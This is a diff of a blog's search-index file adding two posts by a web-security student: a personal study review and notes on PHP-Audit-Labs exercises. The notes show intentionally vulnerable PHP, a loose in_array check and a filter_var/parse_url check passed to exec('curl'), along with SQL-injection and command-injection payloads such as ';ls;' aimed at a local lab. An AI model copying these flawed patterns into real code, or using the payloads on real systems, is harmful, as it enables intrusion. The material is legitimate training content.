@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>摸鱼web安全两年总结</title>
+      <link href="/posts/fdb2.html"/>
+      <url>/posts/fdb2.html</url>
+      
+        <content type="html"><![CDATA[<h3 id="开学了"><a href="#开学了" class="headerlink" title="开学了"></a>开学了</h3><p>大三开学了，What’s up，转眼都大三了，学网络安全两年(摸了两年🐟)，回顾一下</p><blockquote><p>发现自己越来越菜…</p></blockquote><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><p>看看去年立的flag<a href="https://lnng.top/posts/ba80.html">学习安全一年总结</a></p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>打打vulnhub</td><td>✓  打了DC1-9</td></tr><tr><td>继续学习常见漏洞</td><td>✓ 看了中间件 thinkphp一点</td></tr><tr><td>学习代码审计</td><td>× 就看过两三个cms，废了废了</td></tr><tr><td>学习内网相关知识</td><td>✓ att&amp;ck打了几个，看了一些认证协议，写了个免杀小工具</td></tr><tr><td>学习脚本语言Python</td><td>× Python直接没咋看，就平常看些师傅的工具 ，改看go了</td></tr><tr><td>sqlmap等工具，也尝试自己写点小工具(尽力吧!?)</td><td>× sqlmap看了几个命令，没整tamper(等于没学)    小工具没咋写(马上写！！！)</td></tr></tbody></table><hr><p>总结:</p><p>flag白立了<img src="/images/pasted-633.png" alt="upload successful"></p><h3 id="继续立flag！！！一定完成"><a href="#继续立flag！！！一定完成" class="headerlink" title="继续立flag！！！一定完成"></a>继续立flag！！！一定完成</h3><ul><li>阅读师傅们优秀的开源代码，写个稍微大点的工具项目</li><li>学习java框架，看看java审计， 熟悉php代码审计，了解使用CodeQL 代码审计工具原理</li><li>了解小程序 app 硬件设备渗透思路 了解二进制逆向反编译</li><li>继续熟悉内网渗透 了解windows api pe等结构结构</li><li>了解钓鱼攻击，近源攻击 社会工程学 等攻击手法</li><li>了解下机器学习，看看能不能运用到web安全</li><li>挖到几个”有意思”的洞或大厂的洞</li></ul><p>要学的还有蛮多的比如js逆向啥的感觉也得看看，web安全的学习之路是无止境的啊！要保持终身学习!</p><p><img src="/images/pasted-634.png" alt="upload successful"></p><h3 id="最重要"><a href="#最重要" class="headerlink" title="最重要"></a>最重要</h3><p>找到喜欢的web安全方向       学有所广  学有所深</p><p>还有考研和工作方面的选择。。。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 个人日常 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 日记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>常见中间件漏洞</title>
       <link href="/posts/43af.html"/>
       <url>/posts/43af.html</url>
@@ -116,6 +141,31 @@
             <tag> 内网渗透 </tag>
             
             <tag> att&amp;ck红队评估实战靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PHP-Audit-Labs笔记</title>
+      <link href="/posts/bccf.html"/>
+      <url>/posts/bccf.html</url>
+      
+        <content type="html"><![CDATA[<h3 id="PHP-A-udit-Labs"><a href="#PHP-A-udit-Labs" class="headerlink" title="PHP-A udit-Labs"></a>PHP-A udit-Labs</h3><p>地址:<br><a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener">https://github.com/hongriSec/PHP-Audit-Labs</a></p><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p><img src="/images/pasted-427.png" alt="upload successful"><br>个人测试php</p><pre><code>&lt;?php$rate = $_POST[&#39;rate&#39;];$conf[&#39;Whitelist&#39;] = array(1,2,3,4,5);if(in_array($rate, $conf[&#39;Whitelist&#39;])){    echo &quot;在白名中&quot;;}else{    echo &quot;不在白名单中&quot;;}?&gt;</code></pre><p><img src="/images/pasted-428.png" alt="upload successful"><br>PHP在使用 in_array() 函数判断时，会将1 union select user(); 强制转换成数字1;容易发生在文件上传 sql中</p><p>修复:将 in_array() 函数的第三个参数设置为 true ，或者使用 intval() 函数将变量强转成数字，又或者使用正则匹配来处理变量。</p><h3 id="filter-var函数缺陷"><a href="#filter-var函数缺陷" class="headerlink" title="filter_var函数缺陷"></a>filter_var函数缺陷</h3><pre><code>// index.php&lt;?php $url = $_GET[&#39;url&#39;];if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL)){    $site_info = parse_url($url);    if(preg_match(&#39;/sec-redclub.com$/&#39;,$site_info[&#39;host&#39;])){        exec(&#39;curl &quot;&#39;.$site_info[&#39;host&#39;].&#39;&quot;&#39;, $result);        echo &quot;&lt;center&gt;&lt;h1&gt;You have curl {$site_info[&#39;host&#39;]} successfully!&lt;/h1&gt;&lt;/center&gt;              &lt;center&gt;&lt;textarea rows=&#39;20&#39; cols=&#39;90&#39;&gt;&quot;;        echo implode(&#39; &#39;, $result);    }    else{        die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;);    }}else{    echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;;}?&gt;</code></pre><p>大佬绕过 filter_var</p><p><a href="https://mochazz.github.io/2018/08/18/PHP-Audit-Labs%E9%A2%98%E8%A7%A3%E4%B9%8BDay1-4/#Day2%E9%A2%98%E8%A7%A3%EF%BC%9A-By-%E4%B8%83%E6%9C%88%E7%81%AB" target="_blank" rel="noopener">https://mochazz.github.io/2018/08/18/PHP-Audit-Labs%E9%A2%98%E8%A7%A3%E4%B9%8BDay1-4/#Day2%E9%A2%98%E8%A7%A3%EF%BC%9A-By-%E4%B8%83%E6%9C%88%E7%81%AB</a></p><pre><code>http://localhost/index.php?url=http://demo.com@sec-redclub.comhttp://localhost/index.php?url=http://demo.com&amp;sec-redclub.comhttp://localhost/index.php?url=http://demo.com?sec-redclub.comhttp://localhost/index.php?url=http://demo.com/sec-redclub.comhttp://localhost/index.php?url=demo://demo.com,sec-redclub.comhttp://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/http://localhost/index.php?url=http://demo.com#sec-redclub.com</code></pre><p><img src="/images/pasted-429.png" alt="upload successful"><br>然后就是命令执行</p><pre><code>http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/</code></pre><p><img src="/images/pasted-430.png" alt="upload successful"><br>关于curl parse_url()绕过，这大佬文章讲的手法也很nice<br><a href="https://www.anquanke.com/post/id/101058#h2-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/101058#h2-4</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 代码审计 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PHP-Audit-Labs </tag>
             
         </tags>
       
